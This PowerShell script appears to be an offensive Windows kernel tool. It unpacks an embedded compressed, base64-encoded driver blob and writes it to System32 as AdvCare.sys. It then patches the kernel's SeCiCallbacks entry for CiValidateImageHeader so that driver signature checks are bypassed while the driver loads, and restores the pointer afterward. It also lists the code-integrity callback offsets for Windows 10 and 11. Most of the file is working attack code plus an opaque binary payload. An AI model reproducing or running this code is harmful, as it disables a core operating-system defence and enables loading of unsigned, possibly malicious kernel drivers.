function Import-EmbeddedBlock {
    [CmdletBinding(DefaultParameterSetName = "ToFile")]
    param (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$BlockName,

        [Parameter(Mandatory=$true, ParameterSetName="ToFile")]
        [string]$OutPath,

        [Parameter(Mandatory=$true, ParameterSetName="ToBytes")]
        [switch]$OutBytes
    )

    try {
        # Managed .NET Read (significant speed boost over Get-Content)
        $content = [System.IO.File]::ReadAllText($PSCommandPath)

        # Managed .NET Regex for extraction
        $regexPattern = "(?s)## $BlockName ##\r?\n<#\r?\n(.*?)\r?\n#>\r?\n## END ##"
        $match = [System.Text.RegularExpressions.Regex]::Match($content, $regexPattern)

        if (-not $match.Success) {
            Write-Warning "Block '## $BlockName ##' not found."
            return $false
        }

        # Cleanup Base64 and Decompress via .NET Streams
        $b64 = $match.Groups[1].Value -replace "[\r\n\s]", ""
        $data = [System.Convert]::FromBase64String($b64)
        
        $msIn = [System.IO.MemoryStream]::new($data)
        $deflate = [System.IO.Compression.DeflateStream]::new($msIn, [System.IO.Compression.CompressionMode]::Decompress)
        $msOut = [System.IO.MemoryStream]::new()
        
        $deflate.CopyTo($msOut)
        $finalBytes = $msOut.ToArray()

        # Explicit cleanup
        $deflate.Dispose(); $msIn.Dispose(); $msOut.Dispose()

        # Output Logic
        switch ($PSCmdlet.ParameterSetName) {
            "ToFile" {
                $fullPath = [System.IO.Path]::GetFullPath($OutPath)
                $dir = [System.IO.Path]::GetDirectoryName($fullPath)

                # Managed Directory Creation
                if ($dir -and -not [System.IO.Directory]::Exists($dir)) {
                    [System.IO.Directory]::CreateDirectory($dir) | Out-Null
                }

                [System.IO.File]::WriteAllBytes($fullPath, $finalBytes)
                return $true
            }
            "ToBytes" {
                return $finalBytes
            }
        }
    } catch {
        Write-Error "Failed to process block $BlockName : $($_.Exception.Message)"
        return $false
    }
}
function Invoke-SeValidateImageHeaderHook-v2 {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, ParameterSetName = 'InstallSet')]
        [Switch]$Install,

        [Parameter(Mandatory = $true, ParameterSetName = 'RemoveSet')]
        [Switch]$Remove,

        [Parameter(Mandatory = $false)]
        [Int64]$KernelBaseAddress = 0,
        $function  = 'SeGetCachedSigningLevel',
        $distance  = 0x10,
        $IdaOffset = $Global:Offset
    )

    process {

        $kernelBase  = [Int64](Get-KernelBaseAddress)
        $BaseAddress = Resolve-SymbolFromFile -Dll ntoskrnl.exe -FunctionName MmIsAddressValid | select -ExpandProperty StaticBase

        #$RVA = 0L
        #$ProcedureAddress = [IntPtr]::Zero
        #$hModule = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe
        #$AnsiPtr = Init-NativeString -Value $function -Encoding Ansi
        #$Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
        #Free-NativeString -StringPtr $AnsiPtr

        $Func      = Resolve-SymbolFromFile -FunctionName SeGetCachedSigningLevel -DllName ntoskrnl.exe
        $FuncBytes = $Func | select -ExpandProperty Bytes
        $FuncRVA   = $Func | select -ExpandProperty RVA
        
        for ($i = 0; $i -lt 12; $i++) {
            if ($FuncBytes[$i] -eq 0x4C -and $FuncBytes[$i+1] -eq 0x8B -and $FuncBytes[$i+2] -eq 0x1D) {
                $DispOffset = $i + 3
                $Displacement = [BitConverter]::ToInt32($FuncBytes, $DispOffset)
                $NextInstructionOffset = $i + 7
                $ModuleBase = $hModule
               #$FuncRVA = $ProcedureAddress.ToInt64() - $ModuleBase.ToInt64()
                $RVA = $FuncRVA + $NextInstructionOffset + $Displacement           
                break
        }}

        if ($RVA -eq 0) { 
            throw "Failed to resolve $Function offset Or Pattern didn't Match."
        }
        $CalcRVA               = $RVA + $distance
        $SeValidateImageHeader = $kernelBase + $CalcRVA

        $RVA = 0L
        $RVA = Resolve-SymbolFromHandle -Symbol NT!ZwFlushInstructionCache
        if ($RVA -eq 0) { 
            throw "Failed to resolve ZwFlushInstructionCache offset Or Pattern didn't Match."
        }

        # --- MODE 1: INSTALL THE HOOK ---
        if ($PSCmdlet.ParameterSetName -eq 'InstallSet') {

            Write-Verbose "Resolving kernel addresses and installing hook..."

            # Save the original pointer state before modifying
            if ($global:CallbackAddress -eq $null) {
                $global:CallbackAddress = Read-VirtualAddress -VA $SeValidateImageHeader -AsLong
            }

            $BindObj = Bind-KernelAddress -VA $SeValidateImageHeader
            if ($BindObj -ne $null) {
                [marshal]::WriteInt64($BindObj.BaseVA, $BindObj.ByteOffset, ($kernelBase + $RVA))
                Bind-KernelAddress -Package $BindObj -Release
            }
            
            $hookedAddress  = $kernelBase + $RVA
            $writtenValue   = Read-VirtualAddress -VA $SeValidateImageHeader -AsLong
            $writeSucceeded = $writtenValue -eq $hookedAddress

            $ciBase         = Resolve-DriverAddress ci.dll
            $ciValidate     = Resolve-SymbolFromPdb -BinaryPath "C:\Windows\System32\ci.dll" -FunctionName CiValidateImageHeader
            $ciTarget       = [long]$ciBase + [long]$ciValidate
            $isCiMatch      = [long]$global:CallbackAddress -eq $ciTarget

            $IdaOffsetVal = [Int64]$BaseAddress + [Int64]$CalcRVA - [Int64]$IdaOffset

            Write-Host "[+] Hook successfully installed." -ForegroundColor Green
            Write-Host ("    Original Address  = {0:X}"         -f $global:CallbackAddress)
            Write-Host ("    Hooked Address    = {0:X}"         -f $hookedAddress)
            Write-Host ("    Write Succeeded   = {0}"           -f $writeSucceeded)
            Write-Host ("    Target Address    = {0}"           -f "CiValidateImageHeader")
            Write-Host ("    Callback == CiVal = {0}"           -f $isCiMatch)
            Write-Host ("    Kernel RVA Offset = {0}"           -f $CalcRVA)
            Write-Host ("    IDA Fixed Offset  = [*G, {0:X16}]" -f $IdaOffsetVal)
            Write-Host ("    IDA *RVA* Offset  = {0}"           -f $IdaOffset)
            Write-Host
        }

        # --- MODE 2: REMOVE THE HOOK ---
        elseif ($PSCmdlet.ParameterSetName -eq 'RemoveSet') {

            Write-Verbose "Restoring original pointer state..."

            if ($null -eq $global:CallbackAddress) {
                Write-Error "Cannot remove hook: No active callback state is saved in memory."
                return
            }

            $BindObj = Bind-KernelAddress -VA $SeValidateImageHeader
            if ($BindObj -ne $null) {
                [marshal]::WriteInt64($BindObj.BaseVA, $BindObj.ByteOffset, $global:CallbackAddress)
                Bind-KernelAddress -Package $BindObj -Release
            }
            $global:CallbackAddress = $null
            
            Write-Host "Hook successfully removed and memory restored." -ForegroundColor Yellow
        }
    }
}

Clear-Host
Write-Host

# Try 0x20 on Case of ... <>
$Global:Offset = 0x20
Import-EmbeddedBlock -BlockName AdvCareUn -OutPath C:\Windows\System32\AdvCare.sys

$handle = 0
Invoke-SeValidateImageHeaderHook-v2 -Install
try {
    $handle = Get-FileHandle -FileName AdvCare
} catch {}
[string]::Format("Handle : {0}", $handle)
Free-IntPtr $handle -Method NtHandle
Stop-Service AdvCare -ErrorAction SilentlyContinue
Invoke-SeValidateImageHeaderHook-v2 -Remove

$CI_Base     = Resolve-DriverAddress ci.dll
$BaseAddress = Resolve-SymbolFromFile -Dll ntoskrnl.exe -FunctionName MmIsAddressValid | select -ExpandProperty StaticBase
$CallbackRVA = Resolve-SymbolFromPdb -FunctionName SeCiCallbacks

Write-Host

# Resolve the exact SeCiCallbacks label base (0x140C1DAE0)
$kernelBase  = Get-KernelBaseAddress
$VA          = [Int64]$kernelBase + [Int64]$CallbackRVA

# Define profiles for Windows 10 and Windows 11 callback structures
# CI.DLL, __int64 __fastcall CiInitialize -> __int64 __fastcall CipInitialize

$Win10Callbacks = @(
    @{ Offset = 0x08; Name = "CiSetFileCache" },
    @{ Offset = 0x10; Name = "CiGetFileCache" },
    @{ Offset = 0x18; Name = "CiQueryInformation" },
    @{ Offset = 0x20; Name = "CiValidateImageHeader" },
    @{ Offset = 0x28; Name = "CiValidateImageData" },
    @{ Offset = 0x30; Name = "CiHashMemory" },
    @{ Offset = 0x38; Name = "KappxIsPackageFile" },
    @{ Offset = 0x40; Name = "CiCompareSigningLevels" },
    @{ Offset = 0x48; Name = "CiValidateFileAsImageType" },
    @{ Offset = 0x50; Name = "CiRegisterSigningInformation" },
    @{ Offset = 0x58; Name = "CiUnregisterSigningInformation" },
    @{ Offset = 0x60; Name = "CiInitializePolicy" },
    @{ Offset = 0x88; Name = "CipQueryPolicyInformation" },
    @{ Offset = 0x90; Name = "CiValidateDynamicCodePages" },
    @{ Offset = 0x98; Name = "CiQuerySecurityPolicy" },
    @{ Offset = 0xA0; Name = "CiRevalidateImage" },
    @{ Offset = 0xA8; Name = "CiSetInformation" },
    @{ Offset = 0xB0; Name = "CiSetInformationProcess" },
    @{ Offset = 0xB8; Name = "CiGetBuildExpiryTime" },
    @{ Offset = 0xC0; Name = "CiCheckProcessDebugAccessPolicy" },
    @{ Offset = 0xC8; Name = "CiGetCodeIntegrityOriginClaimForFileObject" },
    @{ Offset = 0xD0; Name = "CiDeleteCodeIntegrityOriginClaimMembers" },
    @{ Offset = 0xD8; Name = "CiDeleteCodeIntegrityOriginClaimForFileObject" }
)

$Win11Callbacks = @(
    @{ Offset = 0x08; Name = "CiSetFileCache" },
    @{ Offset = 0x10; Name = "CiGetFileCache" },
    @{ Offset = 0x18; Name = "CiQueryInformation" },
    @{ Offset = 0x20; Name = "CiValidateImageHeader" },
    @{ Offset = 0x28; Name = "CiValidateImageData" },
    @{ Offset = 0x30; Name = "CiHashMemory" },
    @{ Offset = 0x38; Name = "KappxIsPackageFile" },
    @{ Offset = 0x40; Name = "CiCompareSigningLevels" },
    @{ Offset = 0x48; Name = "CiValidateFileAsImageType" },
    @{ Offset = 0x50; Name = "CiRegisterSigningInformation" },
    @{ Offset = 0x58; Name = "CiUnregisterSigningInformation" },
    @{ Offset = 0x60; Name = "CiInitializePolicy" },
    @{ Offset = 0x88; Name = "CipQueryPolicyInformation" },
    @{ Offset = 0x90; Name = "CiQuerySecurityPolicy" },
    @{ Offset = 0x98; Name = "CiRevalidateImage" },
    @{ Offset = 0xA0; Name = "CiSetInformation" },
    @{ Offset = 0xA8; Name = "CiSetInformationProcess" },
    @{ Offset = 0xB0; Name = "CiGetBuildExpiryTime" },
    @{ Offset = 0xB8; Name = "CiCheckProcessDebugAccessPolicy" },
    @{ Offset = 0xC0; Name = "CiGetCodeIntegrityOriginClaimForFileObject" },
    @{ Offset = 0xC8; Name = "CiDeleteCodeIntegrityOriginClaimMembers" },
    @{ Offset = 0xD0; Name = "CiDeleteCodeIntegrityOriginClaimForFileObject" },
    @{ Offset = 0xE0; Name = "CiCompareExistingSePool" },
    @{ Offset = 0xE8; Name = "CiSetCachedOriginClaim" },
    @{ Offset = 0xF0; Name = "CipIsDeveloperModeEnabled" }
)

# Automatically select profile based on OS Major/Minor/Build version (Windows 11 starts at build >= 22000)
$osVersion = [System.Environment]::OSVersion.Version
if ($osVersion.Major -ge 10 -and $osVersion.Build -ge 22000) {
    $AllCallbacks = $Win11Callbacks
    $MaxOffset    = 0xF8
} else {
    $AllCallbacks = $Win10Callbacks
    $MaxOffset    = 0xE0
}

# Read the entire block once based on the matched profile size
$BlockBuffer = Read-VirtualAddress -VA ([IntPtr]$VA) -BlockSize $MaxOffset

# First Offset, SeCiCallbacks
$IdaOffset    = $Global:Offset
$CalcRVA      = Resolve-SymbolFromPdb -FunctionName SeCiCallbacks
$IdaOffsetVal = [Int64]$BaseAddress + [Int64]$CalcRVA - $IdaOffset
$FormattedIda = [String]::Format("IDA Offset [*G, {0:X16}]", $IdaOffsetVal)
$OffsetHex    = [String]::Format("[+0x{0:X2}]", 0x00)

[string]::Format("{0} {1} | Kernel VA -match ** {2,-46}** Address Match: {3}", $FormattedIda, $OffsetHex, '<SeCiCallbacks>', $true)

foreach ($cb in $AllCallbacks) {
    try {
        $FuncSymbol = Resolve-SymbolFromPdb -BinaryPath C:\Windows\System32\ci.dll -FunctionName $cb.Name -ErrorAction Stop
        $ExpectedVA = [Long]$CI_Base + [Long]$FuncSymbol
        
        # Extract the pointer directly from the pre-read byte array block using the offset
        $ActualVA   = [BitConverter]::ToInt64($BlockBuffer, $cb.Offset)
        $MatchResult = ($ActualVA -eq $ExpectedVA)
        
        # Calculate specific IDA Offset matching your static base layout
        $TargetVA     = $VA + $cb.Offset
        $CalcRVA      = $TargetVA - [Int64]$kernelBase
        $IdaOffsetVal = [Int64]$BaseAddress + [Int64]$CalcRVA - $IdaOffset
        $FormattedIda = [String]::Format("IDA Offset [*G, {0:X16}]", $IdaOffsetVal)
        $OffsetHex    = [String]::Format("[+0x{0:X2}]", $cb.Offset)

        [string]::Format("{0} {1} | Kernel VA -match ** {2,-46}** Address Match: {3}", $FormattedIda, $OffsetHex, $cb.Name, $MatchResult)
    }
    catch {
        [string]::Format("[+0x{0:X2}] | Symbol ** {1,-46}** Not Found in PDB (Skipped)", $cb.Offset, $cb.Name)
    }
}

## AdvCareUn ##
<#
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
